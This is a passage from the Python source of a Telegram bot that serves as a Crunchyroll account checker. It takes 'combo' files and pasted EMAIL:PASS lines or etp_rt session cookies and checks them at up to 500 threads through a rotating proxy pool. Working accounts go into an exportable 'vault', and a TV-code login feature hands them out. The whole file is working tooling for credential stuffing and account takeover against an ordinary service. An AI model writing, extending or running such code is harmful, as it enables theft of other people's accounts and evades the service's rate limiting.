                    zname = zinfo.filename
                    if zname.endswith("/") or zname.startswith("__MACOSX") or os.path.basename(zname).startswith("."):
                        continue
                    if not zname.lower().endswith((".txt", ".csv", ".log", ".json", ".dat", ".lst")):
                        continue
                    try:
                        chunks.append(zf.read(zname).decode("utf-8", errors="ignore"))
                    except Exception:
                        continue
        except Exception as e:
            logger.warning("ZIP extract failed: %s", e)
        return "\n".join(chunks)
    return raw_bytes.decode("utf-8", errors="ignore")


# ===================== COMMAND & MESSAGE HANDLERS =====================
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    uid = user.id
    uname = getattr(user, "username", None)
    name = getattr(user, "first_name", None) or uname or str(uid)
    text = welcome_premium_text(uid, name, uname)
    _, rows = menu_main(uid, uname)
    await reply_menu(msg, text, rows)
    try:
        rm = await msg.reply_text(" ", reply_markup=ReplyKeyboardRemove())
        await rm.delete()
    except Exception:
        pass


async def cmd_tv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    args = context.args or []
    if not args:
        set_pending(user.id, "tv_code")
        await reply_menu(
            msg,
            "📺 <b>CRUNCHYROLL TV LOGIN</b>\n━━━━━━━━━━━━━━━━━━━━━\nSend your <b>6-character TV code</b> (e.g. <code>ABCD12</code>):",
            [[("⬅️ Cancel", "menu", "danger")]],
        )
        return
    await _handle_tv_code(msg, user.id, getattr(user, "username", None), args[0])


async def cmd_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    if not is_admin(user.id, getattr(user, "username", None)):
        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
        return

    doc = msg.document or (msg.reply_to_message.document if msg.reply_to_message else None)
    if not doc:
        set_pending(user.id, "file")
        await reply_menu(
            msg,
            "📎 <b>Usage:</b> Reply to a <code>.zip</code>, <code>.txt</code>, <code>.json</code>, or <code>.csv</code> file with <code>/upload</code> (or send the file directly).",
            [[("⬅️ Cancel", "menu", "danger")]],
        )
        return

    await _process_document(msg, context, user.id, doc)


async def cmd_vault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    if not is_admin(user.id, getattr(user, "username", None)):
        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
        return
    await _send_vault_summary(msg, edit=False)


async def cmd_clearvault(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    if not is_admin(user.id, getattr(user, "username", None)):
        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
        return
    save_vault([])
    await reply_menu(msg, "🧹 <b>Vault Cleared!</b>\n🗄️ Accounts in vault: <code>0</code>", [[("⬅️ Menu", "menu", "danger")]])


async def _send_vault_summary(msg, edit: bool = False):
    items = load_vault()
    if not items:
        txt = "🗄️ <b>Crunchyroll Vault is Empty</b>\n\nUse <code>/upload</code> on a <code>.zip/.txt/.json</code> file to add accounts."
        kb = [[("📂 Upload File", "file", "success"), ("⬅️ Menu", "menu", "danger")]]
        await (edit_menu(msg, txt, kb) if edit else reply_menu(msg, txt, kb))
        return

    lines = [
        "🗄️ <b>CRUNCHYROLL VAULT</b>",
        "━━━━━━━━━━━━━━━━━━━━━",
        f"📦 Total Working Accounts: <code>{len(items)}</code>",
        "━━━━━━━━━━━━━━━━━━━━━",
    ]
    for idx, item in enumerate(reversed(items[-8:]), 1):
        cred = item.get("cred") or {}
        d = item.get("data") or {}
        label = cred.get("value", "?") if cred.get("type") == "email" else f"{cred.get('type', 'token')}:{cred.get('value', '')[:16]}..."
        plan = d.get("plan") or "Premium"
        cc = d.get("cc") or ""
        flag = flag_emoji(cc)
        exp = d.get("expiry") or "N/A"
        lines.append(f"<b>{idx}.</b> <code>{esc(label)}</code>\n    └ {flag} {esc(plan)} • Exp: <code>{esc(exp)}</code>")

    kb = [
        [("📤 Export Vault", "vault_export", "primary"), ("🧹 Clear Vault", "vault_clear", "danger")],
        [("📺 TV Login", "tv_prompt", "success"), ("⬅️ Menu", "menu", "danger")],
    ]
    txt = "\n".join(lines)
    await (edit_menu(msg, txt, kb) if edit else reply_menu(msg, txt, kb))


async def cmd_any(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg:
        return
    txt = (msg.text or "").strip().lower()
    uname = getattr(user, "username", None)

    if txt in ("/cmds", "/commands", "/help"):
        await reply_menu(msg, help_text(), [[("⬅️ Back", "menu", "danger")]])
        return
    if txt in ("/proxy", "/proxies", "/proxyinfo", "/pool"):
        if not is_admin(user.id, uname):
            await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        ptext, rows = menu_owner()
        await reply_menu(msg, ptext, rows)
        return
    if txt in ("/addproxy", "/addproxies", "/uploadproxy"):
        if not is_admin(user.id, uname):
            await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        set_pending(user.id, "addpx")
        await reply_menu(msg, "📥 <b>Upload Proxies</b>\n\nPaste <code>user:pass@ip:port</code> or <code>ip:port</code> lines.", [[("⬅️ Back", "proxysettings", "danger")]])
        return
    if txt in ("/clearproxy", "/clearproxies"):
        if not is_admin(user.id, uname):
            await reply_menu(msg, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        await asyncio.to_thread(clear_pool)
        await reply_menu(msg, "🧹 <b>Proxies Cleared</b>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
        return
    if txt.startswith("/addadmin"):
        if user.id != OWNER_ID and user.id not in ADMIN_IDS:
            await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        parts = txt.split()
        if len(parts) < 2 and msg.reply_to_message and msg.reply_to_message.from_user:
            target = msg.reply_to_message.from_user
            ok = STORE.add_admin(target.id, getattr(target, "username", None))
            await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{target.id}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            return
        if len(parts) < 2:
            await reply_menu(msg, "Use: <code>/addadmin 123456789</code> or <code>/addadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        arg = parts[1].lstrip("@")
        ok = STORE.add_admin(int(arg)) if arg.isdigit() else STORE.add_admin(0, arg)
        await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
        return
    if txt.startswith("/removeadmin") or txt.startswith("/deladmin"):
        if user.id != OWNER_ID and user.id not in ADMIN_IDS:
            await reply_menu(msg, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        parts = txt.split()
        if len(parts) < 2:
            await reply_menu(msg, "Use: <code>/removeadmin 123456</code> or <code>/removeadmin @username</code>", [[("⬅️ Back", "menu", "danger")]])
            return
        arg = parts[1].lstrip("@")
        ok = STORE.remove_admin(int(arg)) if arg.isdigit() else STORE.remove_admin(None, arg)
        await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
        return
    if txt in ("/admins", "/adminlist"):
        admins = STORE.get_admins() if STORE else []
        admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
        txt2 = f"👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
        for a in admins:
            txt2 += f"• <code>{a}</code>\n"
        for u in admins_u:
            txt2 += f"• @{u}\n"
        await reply_menu(msg, txt2, [[("⬅️ Back", "menu", "danger")]])
        return

    text, rows = menu_main(user.id, uname)
    await reply_menu(msg, text, rows)


async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.text:
        return
    uid = user.id
    uname = getattr(user, "username", None)
    text = msg.text.strip()
    pending = get_pending(uid)

    if pending:
        kind = pending["kind"]
        if kind == "tv_code":
            clear_pending(uid)
            await _handle_tv_code(msg, uid, uname, text)
            return

        if not is_admin(uid, uname):
            clear_pending(uid)
            await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
            return

        if kind == "creds":
            clear_pending(uid)
            creds = extract_credentials(text)
            if not creds:
                await reply_menu(msg, "❌ No credentials/cookies found.\nFormat: <code>EMAIL:PASS</code> or <code>etp_rt</code>", [[("🔁 Try Again", "check", "success"), ("⬅️ Menu", "menu", "danger")]])
                return
            if len(creds) > MAX_PASTED_CREDS:
                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file instead.", [[("📂 Check File", "file", "primary")]])
                return
            await _run_and_report(msg, uid, text, save_hits_to_vault=True)
            return

        if kind == "addpx":
            clear_pending(uid)
            lines = [l for l in text.splitlines() if l.strip()]
            if not lines:
                return
            ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
            await reply_menu(
                msg,
                f"📥 <b>Proxies Added</b>\n➕ <code>{added}</code> | ⚠️ <code>{invalid}</code> | Pool: <code>{pool_size()}</code> | 🌐 Live: <code>{proxy_count()}</code>",
                [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]],
            )
            return

        if kind == "addadmin":
            clear_pending(uid)
            if uid != OWNER_ID:
                await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                return
            arg = text.strip().lstrip("@")
            ok = STORE.add_admin(int(arg)) if arg.isdigit() else STORE.add_admin(0, arg)
            await reply_menu(msg, f"{'✅ Added' if ok else 'ℹ️ Already'} admin: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            return

        if kind == "remadmin":
            clear_pending(uid)
            if uid != OWNER_ID:
                await reply_menu(msg, "❌ Owner only.", [[("⬅️ Back", "menu", "danger")]])
                return
            arg = text.strip().lstrip("@")
            ok = STORE.remove_admin(int(arg)) if arg.isdigit() else STORE.remove_admin(None, arg)
            await reply_menu(msg, f"{'✅ Removed' if ok else '❌ Not found'}: <code>{esc(arg)}</code>", [[("👥 Admins", "admins", "primary"), ("⬅️ Back", "menu", "danger")]])
            return

        clear_pending(uid)

    # Admin direct paste auto-detection
    if is_admin(uid, uname):
        proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
        maybe_creds = extract_credentials(text)
        if proxy_lines and not maybe_creds:
            ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
            added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
            await reply_menu(msg, f"📥 <b>Proxies Auto-Detected</b>\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code> • Pool: <code>{pool_size()}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]])
            return
        if maybe_creds:
            if len(maybe_creds) > MAX_PASTED_CREDS:
                await reply_menu(msg, f"❌ Too many lines (max {MAX_PASTED_CREDS}). Send a file.", [[("📂 Check File", "file", "primary")]])
                return
            await _run_and_report(msg, uid, text, save_hits_to_vault=True)
            return


async def _process_document(msg, context, uid: int, doc):
    name = (doc.file_name or "unknown.txt").lower()
    if not name.endswith((".txt", ".log", ".json", ".csv", ".dat", ".lst", ".zip")):
        await reply_menu(
            msg,
            "❌ Only <code>.zip / .txt / .json / .csv / .log</code> files allowed.",
            [[("📂 Try Again", "file", "primary"), ("⬅️ Menu", "menu", "danger")]],
        )
        return
    if doc.file_size and doc.file_size > MAX_FILE_MB * 1024 * 1024:
        await reply_menu(msg, f"❌ File too large (max <code>{MAX_FILE_MB} MB</code>).", [[("⬅️ Menu", "menu", "danger")]])
        return

    note = await msg.reply_text("📥 Downloading & extracting file...")
    try:
        tg_file = await context.bot.get_file(doc.file_id)
        buf = io.BytesIO()
        await tg_file.download_to_memory(buf)
        text = await asyncio.to_thread(_extract_text_from_bytes, doc.file_name or "upload.txt", buf.getvalue())
    except Exception as e:
        await note.edit_text(f"❌ Download failed: <code>{esc(str(e)[:120])}</code>", parse_mode=ParseMode.HTML)
        return

    if not text.strip():
        await note.edit_text("❌ File is empty or contains no readable text.")
        return

    proxy_lines = [l for l in text.splitlines() if l.strip() and re.match(r"^(https?://)?([^:]+:[^@]+@)?\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+$", l.strip())]
    combo_creds = extract_credentials(text)
    if proxy_lines and not combo_creds:
        ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
        added, invalid = await asyncio.to_thread(add_proxies_to_pool, [l.strip() for l in text.splitlines() if l.strip()], ac)
        await note.edit_text(
            f"📥 <b>Proxies Added</b>\n➕ <code>{added}</code> • ⚠️ <code>{invalid}</code> • Pool: <code>{pool_size()}</code> • 🌐 Live: <code>{proxy_count()}</code>",
            parse_mode=ParseMode.HTML,
        )
        return

    if not combo_creds:
        await note.edit_text("❌ Koi valid Crunchyroll combo/cookie nahi mili.")
        return

    await note.delete()
    await _run_and_report(msg, uid, text, save_hits_to_vault=True)


async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    msg = update.effective_message
    if not user or not msg or not msg.document:
        return
    uid = user.id
    if not is_admin(uid, getattr(user, "username", None)):
        await reply_menu(msg, "🚫 <b>Admin only!</b>", [[("⬅️ Menu", "menu", "danger")]])
        return

    pending = get_pending(uid)
    if pending and pending.get("kind") == "addpx":
        clear_pending(uid)
        doc = msg.document
        tg_file = await context.bot.get_file(doc.file_id)
        buf = io.BytesIO()
        await tg_file.download_to_memory(buf)
        text = buf.getvalue().decode("utf-8", errors="ignore")
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        ac = bool(STORE.get_setting("auto_check", True)) if STORE else True
        added, invalid = await asyncio.to_thread(add_proxies_to_pool, lines, ac)
        await reply_menu(
            msg,
            f"📥 <b>Proxies Uploaded</b>\n✅ Added: <code>{added}</code> • ⚠️ Invalid: <code>{invalid}</code> • Pool: <code>{pool_size()}</code>",
            [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Menu", "menu", "danger")]],
        )
        return

    clear_pending(uid)
    await _process_document(msg, context, uid, msg.document)


async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global THREADS
    q = update.callback_query
    if not q:
        return
    user = q.from_user
    uid = user.id if user else 0
    uname = getattr(user, "username", None)
    data = q.data or ""
    m = q.message
    await q.answer()

    if data == "menu":
        clear_pending(uid)
        text, rows = menu_main(uid, uname)
        await edit_menu(m, text, rows)
        return

    if data == "help":
        await edit_menu(m, help_text(), [[("⬅️ Back", "menu", "danger")]])
        return

    if data == "status":
        await edit_menu(m, status_text(), [[("⬅️ Back", "menu", "danger")]])
        return

    if data == "tv_prompt":
        set_pending(uid, "tv_code")
        await edit_menu(
            m,
            "📺 <b>CRUNCHYROLL TV LOGIN</b>\n━━━━━━━━━━━━━━━━━━━━━\nSend your <b>6-character TV code</b> (e.g. <code>ABCD12</code>):",
            [[("⬅️ Cancel", "menu", "danger")]],
        )
        return

    if data == "vault_view":
        if not is_admin(uid, uname):
            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        await _send_vault_summary(m, edit=True)
        return

    if data == "vault_clear":
        if not is_admin(uid, uname):
            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        save_vault([])
        await edit_menu(m, "🧹 <b>Vault Cleared!</b>\n🗄️ Accounts: <code>0</code>", [[("⬅️ Menu", "menu", "danger")]])
        return

    if data == "vault_export":
        if not is_admin(uid, uname):
            await edit_menu(m, "🚫 <b>Admin only!</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        items = load_vault()
        if not items:
            await edit_menu(m, "🗄️ Vault is empty.", [[("⬅️ Menu", "menu", "danger")]])
            return
        txt_path = make_export([{**x, "st": "hit"} for x in items], "txt")
        try:
            with open(txt_path, "rb") as f:
                await m.reply_document(document=InputFile(f, filename="crunchyroll_vault.txt"), caption=f"🗄️ Vault Export ({len(items)})")
        finally:
            Path(txt_path).unlink(missing_ok=True)
        return

    if data == "check":
        if not is_admin(uid, uname):
            await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        set_pending(uid, "creds")
        await edit_menu(m, "💎 <b>Check Account</b>\n\nSend <code>EMAIL:PASS</code> or <code>etp_rt</code> cookie — one or many lines.", [[("⬅️ Back", "menu", "danger")]])
        return

    if data == "file":
        if not is_admin(uid, uname):
            await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        set_pending(uid, "file")
        await edit_menu(m, "📂 <b>Check / Upload File</b>\n\nSend your <code>.zip</code>, <code>.txt</code>, <code>.json</code>, or <code>.csv</code> file.", [[("⬅️ Back", "menu", "danger")]])
        return

    if data in ("proxysettings", "opanel"):
        if not is_admin(uid, uname):
            await edit_menu(m, "❌ <b>Admin Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        text, rows = menu_owner()
        await edit_menu(m, text, rows)
        return

    if data == "addpx":
        if not is_admin(uid, uname):
            return
        set_pending(uid, "addpx")
        await edit_menu(m, "📥 <b>Upload Proxies</b>\n\nPaste lines: <code>host:port</code> or <code>user:pass@ip:port</code>", [[("⬅️ Back", "proxysettings", "danger")]])
        return

    if data == "disableproxies":
        if not is_admin(uid, uname):
            return
        with PROXY_LOCK:
            LIVE_PROXIES.clear()
        await edit_menu(m, "🔵 <b>Proxies Disabled</b>\n🌐 Live: <code>0</code>", [[("📤 Upload Proxies", "addpx", "success"), ("⬅️ Back", "proxysettings", "danger")]])
        return

    if data == "clearpool":
        if not is_admin(uid, uname):
            return
        await asyncio.to_thread(clear_pool)
        text, rows = menu_owner()
        await edit_menu(m, "🧹 <b>Pool cleared.</b>\n\n" + text, rows)
        return

    if data == "autoproxy":
        if not is_admin(uid, uname):
            return
        cur = bool(STORE.get_setting("auto_proxy", True)) if STORE else True
        STORE.set_setting("auto_proxy", not cur)
        text, rows = menu_owner()
        await edit_menu(m, f"{'✅ Auto Load ON' if not cur else '⏸️ Auto Load OFF'}\n\n" + text, rows)
        return

    if data == "setthreads":
        if not is_admin(uid, uname):
            return
        await edit_menu(
            m,
            f"🧵 <b>Set Threads</b>\nCurrent: <code>{THREADS}</code>",
            [
                [("🧵 50", "threads_50", "primary"), ("🧵 100", "threads_100", "success")],
                [("🧵 200", "threads_200", "primary"), ("🧵 300", "threads_300", "success")],
                [("⬅️ Back", "proxysettings", "danger")],
            ],
        )
        return

    if data.startswith("threads_"):
        if not is_admin(uid, uname):
            return
        try:
            val = int(data.split("_")[1])
            if 10 <= val <= 500:
                THREADS = val
                if STORE:
                    STORE.set_setting("threads", val)
                await edit_menu(m, f"✅ <b>Threads Set:</b> <code>{THREADS}</code>", [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]])
                return
        except Exception:
            pass
        return

    if data == "refresh":
        if not is_admin(uid, uname):
            return
        await edit_menu(m, "🔄 <b>Refreshing proxies...</b>", None)
        await asyncio.to_thread(refresh_live_proxies, True)
        await edit_menu(
            m,
            f"✅ <b>Proxies Ready</b>\n🌐 Live: <code>{proxy_count()}</code> • 📦 Pool: <code>{pool_size()}</code>",
            [[("⚙️ Proxy Settings", "proxysettings", "primary"), ("⬅️ Back", "menu", "danger")]],
        )
        return

    if data == "admins":
        if uid != OWNER_ID and uid not in ADMIN_IDS:
            await edit_menu(m, "❌ <b>Owner Only</b>", [[("⬅️ Back", "menu", "danger")]])
            return
        admins = STORE.get_admins() if STORE else []
        admins_u = STORE.get_setting("admin_usernames", []) if STORE else []
        txt2 = f"👥 <b>Admins</b>\n━━━━━━━━━━━━━━━━━━━━━\n👑 Owner: <code>{OWNER_ID}</code> @{OWNER_USERNAME.lstrip('@')}\n"
        for a in admins:
            txt2 += f"• <code>{a}</code>\n"
        for u in admins_u:
            txt2 += f"• @{u}\n"
        await edit_menu(m, txt2, [[("➕ Add Admin", "addadmin", "success"), ("➖ Remove Admin", "remadmin", "danger")], [("⬅️ Back", "menu", "danger")]])
        return

    if data == "addadmin":
        if uid != OWNER_ID:
            return
        set_pending(uid, "addadmin")
        await edit_menu(m, "➕ <b>Add Admin</b>\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
        return

    if data == "remadmin":
        if uid != OWNER_ID:
            return
        set_pending(uid, "remadmin")
        await edit_menu(m, "➖ <b>Remove Admin</b>\nSend <code>USER_ID</code> or <code>@username</code>", [[("⬅️ Back", "admins", "danger")]])
        return


async def on_error(update: object, context: ContextTypes.DEFAULT_TYPE):
    logger.error("Unhandled error: %s", context.error, exc_info=context.error)


# ===================== ENTRYPOINT =====================
async def _post_init(app: Application):
    try:
        await app.bot.set_my_commands([
            BotCommand("start", "Main menu"),
            BotCommand("tv", "Activate Crunchyroll TV code"),
            BotCommand("upload", "Upload combo/cookie file to vault (Admin)"),
            BotCommand("vault", "View saved vault accounts (Admin)"),
            BotCommand("proxy", "Proxy settings (Admin)"),
            BotCommand("help", "Help & instructions"),
        ])
    except Exception:
        pass


def main():
    if not BOT_TOKEN or ":" not in BOT_TOKEN:
        print("[!] BOT_TOKEN is not set.")
        sys.exit(1)
    if not OWNER_ID:
        print("[!] OWNER_ID is not set.")
        sys.exit(1)

    global STORE, THREADS
    STORE = Store(DATA_DIR / "store.json")
    try:
        saved_threads = STORE.get_setting("threads", None)
        if saved_threads and 10 <= int(saved_threads) <= 500:
            THREADS = int(saved_threads)
    except Exception:
        pass

    _load_pool_into_live()
    try:
        if bool(STORE.get_setting("auto_proxy", True)):
            threading.Thread(target=refresh_live_proxies, args=(True,), daemon=True).start()
    except Exception:
        pass
    threading.Thread(target=_proxy_loop, daemon=True).start()

    app = Application.builder().token(BOT_TOKEN).post_init(_post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("tv", cmd_tv))
    app.add_handler(CommandHandler("upload", cmd_upload))
    app.add_handler(CommandHandler("vault", cmd_vault))
    app.add_handler(CommandHandler("clearvault", cmd_clearvault))
    app.add_handler(MessageHandler(filters.COMMAND, cmd_any))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(on_button))
    app.add_error_handler(on_error)

    print(f"[+] Crunchyroll Bot running | Owner: {OWNER_ID} | Vault: {vault_count()}")
    app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True)


if __name__ == "__main__":
    main()
